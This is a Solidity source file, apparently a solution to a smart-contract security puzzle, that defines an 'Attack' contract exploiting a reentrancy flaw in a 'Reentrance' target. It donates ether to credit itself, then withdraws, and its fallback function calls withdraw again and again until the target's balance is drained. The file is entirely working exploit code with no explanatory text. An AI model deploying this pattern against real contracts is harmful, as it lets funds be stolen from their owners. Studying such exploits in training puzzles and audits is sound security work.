// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Reentrance} from "./Reentrance.sol";

// forge-std:
contract Attack {
    Reentrance private immutable _REENTRANCE;

    constructor(address reentrance) {
        _REENTRANCE = Reentrance(payable(reentrance));
    }

    function attack() external payable {
        uint256 amount = address(_REENTRANCE).balance;
        _REENTRANCE.donate{value: amount}(address(this));
        try _REENTRANCE.withdraw(amount) {} catch {}
    }

    function _fallback() private {
        uint256 amount = address(_REENTRANCE).balance;
        if (amount > 0) {
            try _REENTRANCE.withdraw(amount) {} catch {}
        }
    }

    fallback() external payable {
        _fallback();
    }
}
